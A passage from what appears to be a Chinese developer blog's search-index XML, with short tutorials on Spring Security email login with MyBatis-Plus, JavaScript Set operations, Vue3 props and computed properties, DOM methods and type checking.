    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="依赖引入">依赖引入</h3>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-security<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-jsqlparser-4.9<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.10.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-spring-boot3-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.10.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.10.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.yulichang<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-join-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="编写数据表实体类">编写数据表实体类</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">  <span class="meta">@TableId(type = IdType.ASSIGN_ID)</span></span><br><span class="line">  <span class="keyword">private</span> Long id;</span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="meta">@NotBlank</span></span><br><span class="line">  <span class="meta">@Email</span></span><br><span class="line">  <span class="keyword">private</span> String email;</span><br><span class="line">  <span class="meta">@NotBlank</span></span><br><span class="line">  <span class="keyword">private</span> String password;</span><br><span class="line">  <span class="keyword">private</span> String persona;</span><br><span class="line">  <span class="keyword">private</span> String enabled;</span><br><span class="line">  <span class="keyword">private</span> String avatar;</span><br><span class="line">  <span class="keyword">private</span> LocalDateTime createTime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="编写-UserDetails-的实现类">编写 UserDetails 的实现类</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserLogin</span> <span class="keyword">implements</span> <span class="title class_">UserDetails</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> User user;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> Collection&lt;? <span class="keyword">extends</span> <span class="title class_">GrantedAuthority</span>&gt; getAuthorities() &#123;</span><br><span class="line">    <span class="keyword">return</span> List.of(<span class="keyword">new</span> <span class="title class_">SimpleGrantedAuthority</span>(<span class="string">&quot;ROLE_&quot;</span> + user.getPersona()));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> user.getPassword();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 使用邮箱登录</span></span><br><span class="line">    <span class="keyword">return</span> user.getEmail();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAccountNonExpired</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> UserDetails.<span class="built_in">super</span>.isAccountNonExpired();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAccountNonLocked</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> UserDetails.<span class="built_in">super</span>.isAccountNonLocked();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCredentialsNonExpired</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> UserDetails.<span class="built_in">super</span>.isCredentialsNonExpired();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEnabled</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 使用1表示启用，0表示禁用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>.equals(user.getEnabled());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="编写-UserMapper-接口">编写 UserMapper 接口</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> <span class="keyword">extends</span> <span class="title class_">MPJBaseMapper</span>&lt;User&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="编写-UserDetailsService-的实现类">编写 UserDetailsService 的实现类</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDetailsServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserDetailsService</span> &#123;</span><br><span class="line">  <span class="meta">@Resource</span></span><br><span class="line">  <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> UserDetails <span class="title function_">loadUserByUsername</span><span class="params">(String username)</span> <span class="keyword">throws</span> UsernameNotFoundException &#123;</span><br><span class="line">    <span class="comment">//查询用户信息</span></span><br><span class="line">    LambdaQueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">    queryWrapper.eq(User::getEmail, username);</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userMapper.selectOne(queryWrapper);</span><br><span class="line">    <span class="comment">//如果没有查询到用户，就抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (Objects.isNull(user)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BadCredentialsException</span>(<span class="string">&quot;用户名或者密码错误！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将数据封装成UserDetails</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UserLogin</span>(user);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="编写自定义控制器">编写自定义控制器</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">  <span class="meta">@Resource</span></span><br><span class="line">  <span class="keyword">private</span> IUserService userService;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@PostMapping(&quot;/login&quot;)</span></span><br><span class="line">  <span class="keyword">public</span> Map&lt;String, String&gt; <span class="title function_">login</span><span class="params">(<span class="meta">@RequestBody</span> <span class="meta">@Validated</span> User user)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> userService.login(user);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="编写-userServiceImpl-实现类">编写 userServiceImpl 实现类</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Map&lt;String, String&gt; <span class="title function_">login</span><span class="params">(User user)</span> &#123;</span><br><span class="line">  <span class="comment">// 进行用户认证，用邮箱作为用户名登陆</span></span><br><span class="line">  <span class="type">UsernamePasswordAuthenticationToken</span> <span class="variable">authenticationToken</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsernamePasswordAuthenticationToken</span>(user.getEmail(), user.getPassword());</span><br><span class="line">  <span class="type">Authentication</span> <span class="variable">authenticate</span> <span class="operator">=</span> authenticationManager.authenticate(authenticationToken);</span><br><span class="line">  <span class="comment">//通过了，生成jwt</span></span><br><span class="line">  <span class="type">UserLogin</span> <span class="variable">loginUser</span> <span class="operator">=</span> (UserLogin) authenticate.getPrincipal();</span><br><span class="line">  <span class="comment">// 可以选择存放在redis ......</span></span><br><span class="line">  Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">  <span class="comment">// 将token返回给前端</span></span><br><span class="line">  map.put(<span class="string">&quot;token&quot;</span>, token);</span><br><span class="line">  <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Spring</tag>
        <tag>Spring security</tag>
      </tags>
  </entry>
  <entry>
    <title>JS 用 Set 实现 交集、并集、差集</title>
    <url>/posts/4cafe26/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 交集</span></span><br><span class="line"><span class="keyword">let</span> intersect = <span class="keyword">new</span> <span class="title class_">Set</span>([...a].<span class="title function_">filter</span>(<span class="function"><span class="params">x</span> =&gt;</span> b.<span class="title function_">has</span>(x)));</span><br><span class="line"><span class="comment">// set &#123;2, 3&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 并集</span></span><br><span class="line"><span class="keyword">let</span> union = <span class="keyword">new</span> <span class="title class_">Set</span>([...a, ...b]);</span><br><span class="line"><span class="comment">// Set &#123;1, 2, 3, 4&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 差集</span></span><br><span class="line"><span class="keyword">let</span> difference = <span class="keyword">new</span> <span class="title class_">Set</span>([...a].<span class="title function_">filter</span>(<span class="function"><span class="params">x</span> =&gt;</span> !b.<span class="title function_">has</span>(x)));</span><br><span class="line"><span class="comment">// Set &#123;1&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3 定义和使用 Porps</title>
    <url>/posts/9245de08/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; description &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">import</span> &#123; defineProps &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="comment">// 定义 Props，在 setup 中props是自动解构的，不需要通过 props.title 来访问</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="title function_">defineProps</span>(&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">title</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 定义 props 的数据类型</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">type</span>: string,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// required 标明这个 prop 是必传的，属性是可选的，默认为 false，</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">required</span>: <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">validator</span>(<span class="params">value</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">// 自定义校验函数，返回 true 表示校验通过，返回 false 表示校验失败</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">return</span> [<span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>].<span class="title function_">includes</span>(value)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">description</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">type</span>: <span class="title class_">String</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 为 prop 提供默认值</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">default</span>: <span class="string">&#x27;Default description&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Vue3</tag>
        <tag>Props</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue 计算属性 computed</title>
    <url>/posts/39f2161a/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>当 computed 内部的变量发生了变化，computed 会重新计算，并返回新的值。</p>
<h3 id="函数式写法">函数式写法</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 可以通过模板语法直接使用 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;&#123;&#123; sum &#125;&#125;&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123; </span><br><span class="line">    computed:&#123;  </span><br><span class="line">        sum()&#123;  </span><br><span class="line">            return this.num1 + this.num2  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h3 id="setup-写法">setup 写法</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 可以通过模板语法直接使用 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;&#123;&#123; sum &#125;&#125;&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123; </span><br><span class="line">    setup()&#123;  </span><br><span class="line">        const num1 = ref(1)  </span><br><span class="line">        const num2 = ref(1)  </span><br><span class="line">        let sum = computed(()=&gt;&#123;  </span><br><span class="line">            return num1.value + num2.value   </span><br><span class="line">        &#125;) </span><br><span class="line">        return &#123;</span><br><span class="line">            sum</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h3 id="options-写法">options 写法</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 可以通过模板语法直接使用 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;&#123;&#123; sum &#125;&#125;&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123; </span><br><span class="line">    computed:&#123; </span><br><span class="line">        sum:&#123;  </span><br><span class="line">            get()&#123; </span><br><span class="line">                return this.num1 * this.num2</span><br><span class="line">            &#125;,</span><br><span class="line">            set(value)&#123; </span><br><span class="line">                this.num1 = value / 2 </span><br><span class="line">                this.num2 = value / 3</span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Vue3</tag>
        <tag>Computed</tag>
      </tags>
  </entry>
  <entry>
    <title>JS DOM 创建与获取</title>
    <url>/posts/16e4e576/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="创建节点">创建节点</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个元素节点，参数为标签名</span></span><br><span class="line">ele.<span class="title function_">createElement</span>(<span class="string">&quot;p&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="创建文本节点">创建文本节点</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个文本节点，参数为文本内容</span></span><br><span class="line">ele.<span class="title function_">createTextNode</span>(<span class="string">&quot;文本内容&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="在元素内部的末尾添加节点">在元素内部的末尾添加节点</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在元素内部的末尾添加节点，参数为要添加的节点</span></span><br><span class="line">ele.<span class="title function_">appendChild</span>(node)</span><br></pre></td></tr></table></figure>
<h3 id="在元素内部的末尾添加内容或节点">在元素内部的末尾添加内容或节点</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// args 参数可以是 DOM 节点、DOM 节点数组、HTML 字符串、文本字符串</span></span><br><span class="line">ele.<span class="title function_">append</span>(...args)</span><br></pre></td></tr></table></figure>
<h3 id="在元素内，将节点添加到指定节点之前，返回添加的子节点">在元素内，将节点添加到指定节点之前，返回添加的子节点</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果给定的节点已经存在于文档中， 会将其从当前位置移动到新位置。（也就是说，它会在附加到指定的新父节点之前自动从现有的父节点中移除。）这意味着一个节点不能同时存在于文档的两个位置。</span></span><br><span class="line">ele.<span class="title function_">insertBefore</span>(newNode, node);</span><br></pre></td></tr></table></figure>
<h3 id="删除节点">删除节点</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 删除 ele 节点，包括其子节点</span></span><br><span class="line">ele.<span class="title function_">remove</span>()</span><br></pre></td></tr></table></figure>
<h3 id="删除子节点">删除子节点</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ele.<span class="title function_">removeChild</span>(childNode);</span><br></pre></td></tr></table></figure>
<h3 id="替换节点">替换节点</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ele.<span class="title function_">replaceChild</span>(newNode, oldNode);</span><br></pre></td></tr></table></figure>
<h3 id="克隆节点">克隆节点</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 参数为 true，则执行深拷贝，复制节点及其子节点；参数为 false，则执行浅拷贝，只复制节点本身，不复制子节点。(默认为false)</span></span><br><span class="line">ele.<span class="title function_">cloneNode</span>(deep);</span><br></pre></td></tr></table></figure>
<h3 id="获取父节点">获取父节点</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ele.<span class="property">parentNode</span></span><br></pre></td></tr></table></figure>
<h3 id="找到最近的指定父节点">找到最近的指定父节点</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ele.<span class="title function_">closest</span>(<span class="string">&quot;selector&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="获取节点">获取节点</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取元素节点，参数为id名</span></span><br><span class="line">ele.<span class="title function_">getElementById</span>(<span class="string">&quot;id&quot;</span>)</span><br><span class="line"><span class="comment">// 获取元素节点，参数为class名</span></span><br><span class="line">ele.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;class&quot;</span>)</span><br><span class="line"><span class="comment">// 获取元素节点，参数为标签名</span></span><br><span class="line">ele.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;tag&quot;</span>)</span><br><span class="line"><span class="comment">// 获取元素节点，参数为任何选择器</span></span><br><span class="line">ele.<span class="title function_">querySelector</span>(<span class="string">&quot;selector&quot;</span>)</span><br><span class="line"><span class="comment">// 获取元素节点，参数为任何选择器</span></span><br><span class="line">ele.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;selector&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JS 判断数据类型</title>
    <url>/posts/e001cad0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// typeof 操作符可以返回一个值的类型。对于对象（包括数组和 null），typeof 会返回 &quot;object&quot;，但它不能区分数组和对象，因此需要额外判断。</span></span><br><span class="line"><span class="keyword">typeof</span> value</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回 [object Type]，value可以是任意值</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(value)</span><br><span class="line"></span><br><span class="line"><span class="comment">// instanceof 运算符可以判断一个对象是否是某个构造函数的实例。如果需要判断一个对象是否是 Object 类型的实例，可以使用 instanceof Object。</span></span><br><span class="line"><span class="comment">// 需要注意，instanceof 对数组和对象都会返回 true，因此需要 value !== null 排除 null。</span></span><br><span class="line">value <span class="keyword">instanceof</span> <span class="title class_">Constructor</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝桥杯 Web 练习</title>
    <url>/posts/17b3dfa8/</url>
